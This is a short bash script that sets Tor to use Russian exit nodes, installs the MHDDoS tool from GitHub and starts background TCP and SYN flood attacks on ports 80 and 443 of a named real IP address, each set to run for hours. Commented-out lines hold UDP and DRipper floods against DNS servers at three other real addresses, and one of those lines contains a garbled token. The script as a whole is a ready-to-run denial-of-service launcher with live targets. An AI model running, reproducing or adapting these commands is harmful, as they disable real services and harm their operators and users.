#!/bin/bash

echo "ExitNodes {ru}">> /etc/tor/torrc
echo "StrictNodes 1" >> /etc/tor/torrc
service tor restart

git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip3 install -r requirements.txt

python3 start.py TCP 178.154.243.105:80 999 36000 5 socks.txt > /home/ec2-user/MHDDoS.log 2>&1  &
python3 start.py TCP 178.154.243.105:443 999 36000 5 socks.txt > /home/ec2-user/MHDDoS.log 2>&1  &
python3 start.py SYN 178.154.243.105:443 999 36000 > /home/ec2-user/MHDDoS.log 2>&1  &
python3 start.py SYN 178.154.243.105:80 999 36000 > /home/ec2-user/MHDDoS.log 2>&1  &
#python3 start.py udеудтуе p 217.175.155.100:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log 2>&1  &
#python3 start.py udp 217.175.155.12:53 5 100 socks5.txt 100 360000 > /home/ec2-user/MHDDoS.log 2>&1  &
#python3 start.py udp 217.175.140.71:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log 2>&1  &

sleep 10;

#torsocks -P 9050 python3 DRipper.py -s 217.175.155.100 -p 53 -t 135 -m udp
#torsocks -P 9050 python3 DRipper.py -s 217.175.155.12 -p 53 -t 135 -m udp
#torsocks -P 9050 python3 DRipper.py -s 217.175.140.71 -p 53 -t 135 -m udp
